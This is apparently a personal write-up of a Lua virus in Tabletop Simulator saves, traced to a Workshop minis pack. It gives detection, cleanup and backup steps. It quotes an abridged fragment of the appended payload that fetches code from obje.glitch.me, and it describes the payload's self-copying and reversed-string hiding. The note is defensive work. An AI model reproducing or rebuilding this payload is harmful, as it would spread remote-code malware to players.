# The TTS "Spawning object" virus

On 9/23/2026 a Lua virus was found in the TTS install: 707 objects in Nila
(`TS_Save_18`), 400 in staging (`TS_Save_19`) and in `TS_Save_24`, 422 in each
autosave, and six Saved Objects (`tree`, `Beartholomew`, `Beartholomews Echo`,
`The Brass Jackals`, `The Lapis Writ`, `statues`). It came from the Workshop
minis pack **"[Ленивый] Minis" (3618998883)**, which was deleted from
`Mods/Workshop/`. The repo's `tts/lua/` files were clean.

## What it is

Code appended to the end of an object's Lua script, after 400 spaces:

```
--[[Object base code]]Wait.time(function() ... end,1) ...
WebRequest.get("https://obje.glitch.me/", ...) --[[Spawning object]]
```

When loaded it:

- copies itself onto the end of every object's script, and onto every object
  that spawns later;
- sends a request to `obje.glitch.me`, and if the reply starts with `true`,
  writes the rest of the reply into the script and reloads the object.

The script strings are stored reversed (`tcejbo gninwapS`) so a search for
the plain words misses them.

## Finding it

```
rg -l -g '*.json' "gninwapS|obje\.glitch\.me" "/Users/wcb/Library/Tabletop Simulator"
```

Check `Saves/`, `Saves/Saved Objects/` and `Mods/Workshop/`. Run it after
subscribing to a new Workshop item.

## Removing it

`clean-tts-virus` cuts the payload out of the raw file and writes a file only
when the cleaned result, parsed, equals the original with the payload removed,
and none of `gninwapS`, `glitch.me`, `Object base code` or `Spawning object`
appears in it. Without `--write` it only reports.

1. Quit TTS.
2. Back up every infected file.
3. Clean **all** of them in one run. An infected file left behind puts the
   virus back into the others the next time one of its objects spawns.

   ```
   uv --directory /Users/wcb/personal/dnd/scripts run clean-tts-virus --write FILE...
   ```

4. Delete the Workshop item it came from, and unsubscribe from it on Steam, or
   Steam downloads it again.

A file reported as `FAIL` holds a variant the pattern does not match and was
not changed. The minis pack had one such variant.

The 9/23 backups of the infected files are in
`~/Library/Tabletop Simulator/virus-backup-2026-09-23/`. They still hold the
virus, so do not load them into TTS.
